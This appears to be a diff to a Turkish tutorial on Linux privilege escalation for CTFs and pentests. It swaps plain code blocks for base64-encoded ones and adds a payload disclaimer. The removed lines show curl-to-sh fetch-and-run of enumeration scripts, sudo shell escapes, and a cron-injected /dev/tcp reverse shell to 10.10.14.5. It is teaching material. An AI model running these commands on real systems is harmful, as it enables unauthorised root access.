@@ -5,6 +5,8 @@ description: "CTF ve gerçek dünya senaryolarında Linux'ta yetki yükseltmenin
 tags: ["Linux", "Pentest", "CTF"]
 ---
 
+<PayloadDisclaimer />
+
 ## Neden Privesc?
 
 Bir sisteme erişim sağladığınızda genellikle düşük yetkili bir kullanıcı olarak başlarsınız. **Privilege escalation** (privesc), bu erişimi `root` veya `SYSTEM` seviyesine yükseltme sürecidir. CTF'lerde final flag, gerçek pentestlerde ise tam sistem kontrolü burada gizlidir.
@@ -63,42 +65,19 @@ find / -perm -2000 -type f 2>/dev/null
 
 Manuel kontrolleri tamamladıktan sonra otomatik araçları çalıştırın:
 
-```bash
-# LinPEAS — en kapsamlı araç
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-
-# LinEnum
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-chmod +x LinEnum.sh && ./LinEnum.sh
-
-# linux-smart-enumeration
-wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
-chmod +x lse.sh && ./lse.sh -l 1
-```
+<EncodedCodeBlock language="bash" data="IyBMaW5QRUFTIOKAlCBlbiBrYXBzYW1sxLEgYXJhw6cKY3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vY2FybG9zcG9sb3AvUEVBU1MtbmcvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2xpbnBlYXMuc2ggfCBzaAoKIyBMaW5FbnVtCndnZXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlYm9vdHVzZXIvTGluRW51bS9tYXN0ZXIvTGluRW51bS5zaApjaG1vZCAreCBMaW5FbnVtLnNoICYmIC4vTGluRW51bS5zaAoKIyBsaW51eC1zbWFydC1lbnVtZXJhdGlvbgp3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9kaWVnby10cmVpdG9zL2xpbnV4LXNtYXJ0LWVudW1lcmF0aW9uL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9sc2Uuc2gKY2htb2QgK3ggbHNlLnNoICYmIC4vbHNlLnNoIC1sIDE=" />
 
 ## Yaygın Vektörler
 
 ### 1. Sudo Hakkı Sömürme
 
-```bash
-# sudo -l çıktısında tehlikeli komutlar
-sudo find /tmp -exec /bin/bash \;
-sudo vim -c ':!/bin/bash'
-sudo awk 'BEGIN {system("/bin/bash")}'
-sudo python3 -c 'import os; os.system("/bin/bash")'
-```
+<EncodedCodeBlock language="bash" data="IyBzdWRvIC1sIMOnxLFrdMSxc8SxbmRhIHRlaGxpa2VsaSBrb211dGxhcgpzdWRvIGZpbmQgL3RtcCAtZXhlYyAvYmluL2Jhc2ggXDsKc3VkbyB2aW0gLWMgJzohL2Jpbi9iYXNoJwpzdWRvIGF3ayAnQkVHSU4ge3N5c3RlbSgiL2Jpbi9iYXNoIil9JwpzdWRvIHB5dGhvbjMgLWMgJ2ltcG9ydCBvczsgb3Muc3lzdGVtKCIvYmluL2Jhc2giKSc=" />
 
 GTFOBins (`gtfobins.github.io`) her binary için sömürü yöntemini listeler.
 
 ### 2. Yazılabilir Cron Job
 
-```bash
-# /etc/crontab içinde root çalıştıran ama yazılabilir script
-* * * * * root /opt/backup.sh
-
-# Eğer backup.sh yazılabilirse:
-echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" >> /opt/backup.sh
-```
+<EncodedCodeBlock language="bash" data="IyAvZXRjL2Nyb250YWIgacOnaW5kZSByb290IMOnYWzEscWfdMSxcmFuIGFtYSB5YXrEsWxhYmlsaXIgc2NyaXB0CiogKiAqICogKiByb290IC9vcHQvYmFja3VwLnNoCgojIEXEn2VyIGJhY2t1cC5zaCB5YXrEsWxhYmlsaXJzZToKZWNobyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMSIgPj4gL29wdC9iYWNrdXAuc2g=" />
 
 ### 3. SUID Binary — GTFOBins
 
